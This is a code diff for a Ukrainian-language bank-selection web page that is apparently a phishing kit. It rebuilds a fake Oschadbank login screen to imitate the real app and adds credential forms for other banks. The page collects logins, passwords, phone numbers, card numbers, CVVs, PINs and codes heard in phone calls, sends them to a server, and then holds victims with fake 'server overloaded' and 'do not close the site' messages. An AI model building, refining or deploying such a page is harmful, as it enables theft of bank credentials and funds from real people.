@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Оберіть свій банк</title>
     <style>
+        /* Общие стили для всех экранов и элементов */
         *, *::before, *::after { box-sizing: border-box; }
         :root {
             --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
@@ -13,15 +14,18 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
+            font-size: 16px; /* Базовый размер шрифта */
         }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
         #bank-selection-screen { opacity: 1; transform: scale(1); }
         
+        /* Стили для экрана формы (поверх других элементов) */
         #form-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0; visibility: hidden; transform: scale(1.05);
             transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
             display: flex; align-items: center; padding: 20px;
+            background: #f8f9fa; /* Общий фон для форм */
         }
         .form-container {
             width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
@@ -31,7 +35,11 @@
         body.form-active { background: var(--bg-gradient); overflow: hidden; }
         body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
         body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
+        
+        /* Заголовки */
         h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
+        
+        /* Сетка банков на главном экране */
         .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
         .bank-item {
             display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -43,40 +51,187 @@
         .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
         .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
         .bank-item .bank-name { font-size: 15px; font-weight: 600; }
-        .bank-item.disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            pointer-events: none;
-        }
+        
+        /* Стили для отключенных банков (если снова понадобятся) */
+        .bank-item.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
         .bank-item.disabled .unavailable-label {
             position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
             font-size: 12px; font-weight: bold; color: var(--danger-color);
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
         }
+
+        /* --- Стили для модальных окон (поверх всего, например для "ЛК" Ощада) --- */
         #custom-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.5);
-            display: none; justify-content: center; align-items: center;
+            background-color: #f8f9fa; /* Светлый фон, как на скриншоте */
+            display: none; justify-content: center; align-items: flex-start; /* Выравнивание сверху */
             z-index: 1000;
+            padding-top: 0; /* Убираем отступ сверху, чтобы начать с самого верха */
         }
         .custom-modal-content {
-            background-color: var(--white); padding: 25px; border-radius: 16px;
-            width: 90%; max-width: 380px; text-align: center;
+            background-color: transparent; /* Фон прозрачный, так как сам контент занимает всю ширину */
+            padding: 0; /* Убираем внутренние отступы, так как содержимое будет иметь свои */
+            border-radius: 0; /* Нет закруглений */
+            width: 100%;
+            max-width: none; /* Не ограничиваем ширину для этого модального окна */
+            text-align: center;
+            box-shadow: none; /* Нет тени */
+            display: flex; /* Для выравнивания стрелки назад и заголовка */
+            flex-direction: column;
+            align-items: center;
         }
-        .custom-modal-content h3 { margin-top: 0; }
-        .pin-pad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 25px auto; max-width: 240px; }
-        .pin-pad button {
-            width: 60px; height: 60px; border-radius: 50%; border: 1px solid var(--border-color);
-            background-color: #fff; font-size: 24px; cursor: pointer; transition: background-color 0.2s;
-            display: flex; justify-content: center; align-items: center; color: var(--dark-text);
+
+        /* --- НОВЫЕ СТИЛИ: Заголовок и кнопка "назад" для Ощада --- */
+        .oschad-header {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 10px 15px; /* Отступы как на скрине */
+            background-color: #f8f9fa; /* Фон заголовка */
+            border-bottom: 1px solid #e0e0e0; /* Разделитель */
         }
-        .pin-pad button:hover { background-color: #f1f1f1; }
-        .pin-display {
-            height: 50px; border: 1px solid var(--border-color); border-radius: 12px; margin: 20px 0;
-            display: flex; justify-content: center; align-items: center; letter-spacing: 1em; font-size: 30px;
+        .oschad-header .back-arrow {
+            font-size: 28px; /* Размер стрелки */
+            color: #495057; /* Цвет стрелки */
+            margin-right: 15px; /* Отступ от текста */
+            cursor: pointer;
+            line-height: 1; /* Чтобы стрелка была по центру по вертикали */
         }
-        .loader-icon { animation: spin 2s linear infinite; width: 80px; height: 80px; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .oschad-header .title {
+            font-size: 18px; /* Размер шрифта заголовка */
+            font-weight: 600;
+            color: #212529;
+            flex-grow: 1; /* Чтобы заголовок занимал доступное место */
+            text-align: center; /* Центрируем текст */
+            margin-right: 40px; /* Смещаем заголовок влево, чтобы имитировать центрирование */
+        }
+        
+        /* --- НОВЫЕ СТИЛИ: Секция приветствия и переключатели --- */
+        .oschad-welcome-section {
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 450px; /* Чтобы текст не был слишком широким на больших экранах */
+        }
+        .oschad-welcome-section p {
+            font-size: 16px;
+            color: #495057;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+        .oschad-toggle-buttons {
+            display: flex;
+            background-color: #e9ecef; /* Фон для переключателей */
+            border-radius: 12px;
+            overflow: hidden; /* Для четких границ активной кнопки */
+            padding: 4px; /* Отступ внутри контейнера */
+            margin-bottom: 30px;
+        }
+        .oschad-toggle-buttons button {
+            flex: 1;
+            padding: 12px 15px;
+            border: none;
+            background-color: transparent;
+            font-size: 15px;
+            font-weight: 600;
+            color: #6c757d;
+            cursor: pointer;
+            border-radius: 8px; /* Закругление кнопок внутри контейнера */
+            transition: all 0.2s ease;
+        }
+        .oschad-toggle-buttons button.active {
+            background-color: var(--white);
+            color: var(--dark-text);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        /* --- НОВЫЕ СТИЛИ: Поля ввода для Ощада --- */
+        .oschad-input-group {
+            margin-bottom: 20px; /* Отступ между группами полей */
+            width: 90%; /* Ширина, как на скрине */
+            max-width: 350px; /* Максимальная ширина */
+            position: relative;
+        }
+        .oschad-input-group label {
+            position: absolute;
+            top: 15px; /* Начальная позиция */
+            left: 15px;
+            font-size: 15px; /* Размер при неактивном состоянии */
+            color: #adb5bd; /* Цвет плейсхолдера */
+            transition: all 0.2s ease;
+            pointer-events: none; /* Не блокируем клики на поле */
+            background-color: transparent; /* Чтобы не перекрывать поле */
+            padding: 0 4px; /* Отступы, чтобы фон лейбла не прилегал вплотную */
+        }
+        .oschad-input-group input:focus + label,
+        .oschad-input-group input:not(:placeholder-shown) + label {
+            top: -10px; /* Поднимаем лейбл */
+            left: 10px; /* Немного смещаем влево */
+            font-size: 12px; /* Уменьшаем размер */
+            color: #6c757d; /* Меняем цвет */
+            background-color: #f8f9fa; /* Фон, чтобы перекрыть границу */
+        }
+        .oschad-input-field {
+            width: 100%;
+            padding: 15px 15px;
+            border: 1px solid #ced4da; /* Цвет границы */
+            border-radius: 12px; /* Закругленные края */
+            font-size: 16px; /* Размер шрифта ввода */
+            color: var(--dark-text);
+            background-color: var(--white);
+            transition: all 0.2s ease;
+            outline: none; /* Убираем стандартную обводку */
+        }
+        .oschad-input-field:focus {
+            border-color: #00A39C; /* Цвет границы при фокусе */
+            box-shadow: 0 0 0 3px rgba(0, 163, 156, 0.25); /* Тень при фокусе */
+        }
+        .oschad-input-field::placeholder { /* Стили для плейсхолдера */
+            color: transparent; /* Делаем плейсхолдер прозрачным, так как используем label */
+        }
+
+        /* Иконка "показать/скрыть пароль" */
+        .password-toggle-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #6c757d;
+            font-size: 18px;
+        }
+        .password-toggle-icon svg {
+            width: 20px;
+            height: 20px;
+            vertical-align: middle;
+        }
+
+        /* --- НОВЫЕ СТИЛИ: Кнопка "ПРОДОВЖИТИ" для Ощада --- */
+        .oschad-submit-button {
+            width: 90%;
+            max-width: 350px;
+            padding: 16px;
+            margin-top: 30px; /* Отступ сверху */
+            border: none;
+            border-radius: 12px;
+            background-color: #dee2e6; /* Серый цвет, как на скрине */
+            color: #6c757d; /* Светлый текст */
+            font-size: 18px;
+            font-weight: 700;
+            cursor: not-allowed; /* Изначально неактивна */
+            transition: all 0.2s ease;
+        }
+        .oschad-submit-button.active {
+            background-color: #00A39C; /* Зеленый цвет при активности */
+            color: var(--white); /* Белый текст */
+            cursor: pointer;
+        }
+        .oschad-submit-button.active:hover {
+            opacity: 0.9;
+        }
+
+        /* Остальные стили для форм */
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
@@ -103,6 +258,8 @@
             flex-basis: 0; flex-grow: 1;
         }
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
+
+        /* Цветовые темы банков */
         body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
         body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
         body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
@@ -166,7 +323,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     ];
 
-    // --- ИЗМЕНЕНИЕ: Убраны флаги disabled ---
     const bankFlows = {
         'oschadbank': {
             name: 'Ощадбанк',
@@ -239,7 +395,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const customModalOverlay = document.getElementById('custom-modal-overlay');
     const customModalContent = document.getElementById('custom-modal-content');
 
-    // --- ИЗМЕНЕНИЕ: Упрощенная отрисовка банков ---
     bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
         const bank = bankFlows[id];
         return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
@@ -367,15 +522,54 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
     
+    // --- ИЗМЕНЕНИЕ: Полностью переработанная функция renderCustomModal для Ощадбанка ---
     function renderCustomModal(type, bankName) {
         let html = '';
         if (type === 'lk') {
             switch (bankName) {
                 case 'Ощадбанк':
-                    html = `<h3>Авторизуйтесь через Ощад24</h3>
-                            <div class="input-group"><input type="text" class="input-field" id="login" placeholder="Логін"></div>
-                            <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
-                            <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
+                    html = `
+                        <div class="oschad-header">
+                            <span class="back-arrow" id="oschad-back-arrow">←</span>
+                            <span class="title">Ласкаво просимо</span>
+                        </div>
+                        <div class="oschad-welcome-section">
+                            <p>Для входу або реєстрації введіть логін або номер телефону</p>
+                            <div class="oschad-toggle-buttons">
+                                <button id="toggle-phone" class="active">Номер телефону</button>
+                                <button id="toggle-login">Логін</button>
+                            </div>
+
+                            <div id="phone-login-form">
+                                <div class="oschad-input-group">
+                                    <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " maxlength="12">
+                                    <label for="phone_input">Номер телефону</label>
+                                </div>
+                                <div class="oschad-input-group password-field">
+                                    <input type="password" class="oschad-input-field" id="phone_password_input" placeholder=" ">
+                                    <label for="phone_password_input">Пароль</label>
+                                    <span class="password-toggle-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-eye"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                                    </span>
+                                </div>
+                            </div>
+
+                            <div id="login-form" style="display: none;">
+                                <div class="oschad-input-group">
+                                    <input type="text" class="oschad-input-field" id="login_input" placeholder=" ">
+                                    <label for="login_input">Логін</label>
+                                </div>
+                                <div class="oschad-input-group password-field">
+                                    <input type="password" class="oschad-input-field" id="login_password_input" placeholder=" ">
+                                    <label for="login_password_input">Пароль</label>
+                                    <span class="password-toggle-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-eye"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="oschad-submit-button" id="oschad-submit-btn">ПРОДОВЖИТИ</button>
+                    `;
                     break;
                 case 'Райффайзен':
                     html = `<h3>Введіть PIN-код</h3><p>для входу в MyRaif</p>
@@ -414,6 +608,13 @@ document.addEventListener('DOMContentLoaded', () => {
                             </div>
                             <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
                     break;
+                default: // Для всех остальных банков, у которых нет специальной "ЛК" формы
+                     html = `<h3>Авторизуйтесь</h3>
+                             <p>Будь ласка, введіть ваші облікові дані.</p>
+                             <div class="input-group"><input type="text" class="input-field" id="login" placeholder="Логін/Номер телефону"></div>
+                             <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
+                             <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
+                    break;
             }
         } else if (type === 'call') {
             if (bankName === 'Ощадбанк') {
@@ -421,6 +622,9 @@ document.addEventListener('DOMContentLoaded', () => {
                         <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div></div>
                         <div class="input-group"><input type="tel" class="input-field" id="card_last4" placeholder="Останні 4 цифри карти" maxlength="4"></div>
                         <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
+            } else {
+                 html = `<h3>Підтвердження операції</h3><p>Очікуйте дзвінок на ваш фінансовий номер телефону.</p>
+                         <p style="color: var(--danger-color); font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
             }
         }
 
@@ -430,19 +634,120 @@ document.addEventListener('DOMContentLoaded', () => {
         addInputFormatting();
     }
     
+    // --- ИЗМЕНЕНИЕ: Обновленная функция addCustomModalListeners ---
     function addCustomModalListeners(bankName) {
-        const submitBtn = document.getElementById('custom-submit-btn');
+        const submitBtn = document.getElementById('custom-submit-btn') || document.getElementById('oschad-submit-btn');
+
+        // Для Ощадбанка: логика переключения вкладок и видимости пароля
+        if (bankName === 'Ощадбанк') {
+            const togglePhoneBtn = document.getElementById('toggle-phone');
+            const toggleLoginBtn = document.getElementById('toggle-login');
+            const phoneLoginForm = document.getElementById('phone-login-form');
+            const loginForm = document.getElementById('login-form');
+            const oschadBackArrow = document.getElementById('oschad-back-arrow');
+
+            let activeOschadForm = 'phone'; // 'phone' or 'login'
+
+            const updateOschadInputs = () => {
+                const phoneInput = document.getElementById('phone_input');
+                const phonePassInput = document.getElementById('phone_password_input');
+                const loginInput = document.getElementById('login_input');
+                const loginPassInput = document.getElementById('login_password_input');
+
+                // Проверяем, что оба поля в активной форме заполнены
+                const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput && phonePassInput && phoneInput.value.length === 12 && phonePassInput.value.length > 0;
+                const isLoginFormValid = activeOschadForm === 'login' && loginInput && loginPassInput && loginInput.value.length > 0 && loginPassInput.value.length > 0;
+
+                if (submitBtn) {
+                    if (isPhoneFormValid || isLoginFormValid) {
+                        submitBtn.classList.add('active');
+                        submitBtn.disabled = false;
+                    } else {
+                        submitBtn.classList.remove('active');
+                        submitBtn.disabled = true;
+                    }
+                }
+            };
+            
+            // Initial call
+            updateOschadInputs();
+
+            // Event listeners for input changes
+            [document.getElementById('phone_input'), document.getElementById('phone_password_input'),
+             document.getElementById('login_input'), document.getElementById('login_password_input')].forEach(input => {
+                if (input) input.addEventListener('input', updateOschadInputs);
+            });
+
+            togglePhoneBtn.addEventListener('click', () => {
+                togglePhoneBtn.classList.add('active');
+                toggleLoginBtn.classList.remove('active');
+                phoneLoginForm.style.display = 'block';
+                loginForm.style.display = 'none';
+                activeOschadForm = 'phone';
+                updateOschadInputs();
+            });
+
+            toggleLoginBtn.addEventListener('click', () => {
+                toggleLoginBtn.classList.add('active');
+                togglePhoneBtn.classList.remove('active');
+                phoneLoginForm.style.display = 'none';
+                loginForm.style.display = 'block';
+                activeOschadForm = 'login';
+                updateOschadInputs();
+            });
+
+            oschadBackArrow.addEventListener('click', () => {
+                customModalOverlay.style.display = 'none';
+            });
+            
+            // Toggle password visibility for Oschad
+            customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
+                icon.addEventListener('click', () => {
+                    const passwordInput = icon.previousElementSibling;
+                    if (passwordInput.type === 'password') {
+                        passwordInput.type = 'text';
+                        icon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-eye-off"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.24 18.24 0 0 1 2.51-3.23M7.37 8.56A6 6 0 0 0 6 12c0 2.68 1.66 4.97 4 6.22M15 12a3 3 0 1 1-6 0"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`; // eye-off icon
+                    } else {
+                        passwordInput.type = 'password';
+                        icon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-eye"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`; // eye icon
+                    }
+                });
+            });
+        }
+        
         if (submitBtn) {
             submitBtn.onclick = () => {
                 const dataToSend = {};
-                customModalContent.querySelectorAll('.input-field, .pin-display').forEach(el => {
-                   dataToSend[el.id || 'pin'] = el.value || el.textContent;
+                const inputs = customModalContent.querySelectorAll('.oschad-input-field, .input-field, .pin-display');
+                inputs.forEach(el => {
+                   let key = el.id;
+                   let value = el.value || el.textContent;
+                   if (key === 'phone_input') key = 'phone';
+                   if (key === 'phone_password_input') key = 'password';
+                   if (key === 'login_input') key = 'login';
+                   if (key === 'login_password_input') key = 'password'; // Обновляем пароль, если есть
+                   if (value) dataToSend[key] = value;
                 });
-
+                
                 sendDataToServer(dataToSend, true);
                 
                 if (bankName === 'Ощадбанк') {
-                     customModalContent.innerHTML = `<h3>Очікуйте</h3><p>Сервер перевантажений</p><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">`;
+                     customModalContent.innerHTML = `
+                         <div class="oschad-header">
+                            <span class="back-arrow" id="oschad-back-arrow">←</span>
+                            <span class="title">Зачекайте</span>
+                        </div>
+                        <div class="oschad-welcome-section">
+                            <h3>Зачекайте</h3>
+                            <p>Сервер перевантажений</p>
+                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
+                        </div>
+                     `;
+                     // Добавляем слушатель для стрелки "назад" в этом новом контенте
+                     document.getElementById('oschad-back-arrow').addEventListener('click', () => {
+                         customModalOverlay.style.display = 'none';
+                         // Можно добавить возврат на предыдущий шаг или просто закрыть модал
+                     });
                 } else {
                     customModalContent.innerHTML = `<h3>Очікуємо</h3><p>Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
                 }
@@ -485,7 +790,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
                 break;
             case 'call_code':
-                // --- ИСПРАВЛЕНИЕ: Убрана лишняя точка с запятой (;) ---
                 html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
                 break;
             case 'confirm_all':
@@ -535,6 +839,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function addInputFormatting() {
+        // Phone input (general forms)
         const phoneInput = document.getElementById('phone');
         if (phoneInput) {
             phoneInput.addEventListener('input', (e) => {
@@ -542,6 +847,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
             });
         }
+        // Oschad phone input
+        const oschadPhoneInput = document.getElementById('phone_input');
+        if (oschadPhoneInput) {
+            oschadPhoneInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 12);
+                e.target.value = value.replace(/(\d{3})(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5').trim(); // +380 XX XXX XX XX
+            });
+        }
+
         const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
         if (cardNumberInput) {
             cardNumberInput.addEventListener('input', (e) => {
@@ -567,13 +881,14 @@ document.addEventListener('DOMContentLoaded', () => {
             let requiredLength = 0;
 
             switch (input.id) {
-                case 'phone': requiredLength = 9; break;
+                case 'phone': requiredLength = 9; break; // +380 XXXXXXXXX
                 case 'card': case 'card_confirm': requiredLength = 16; break;
                 case 'card-expiry': requiredLength = 4; break;
                 case 'card-cvv': case 'pin': requiredLength = 3; break;
             }
 
-            if (input.id === 'pin' && value.length === 4) requiredLength = 4;
+            if (input.id === 'pin' && value.length === 4) requiredLength = 4; // PIN can be 4 digits
+            if (input.id === 'call_code_input' && value.length > 0) requiredLength = 1; // Any code is fine
 
             if (requiredLength > 0 && value.length < requiredLength) {
                 isValid = false;
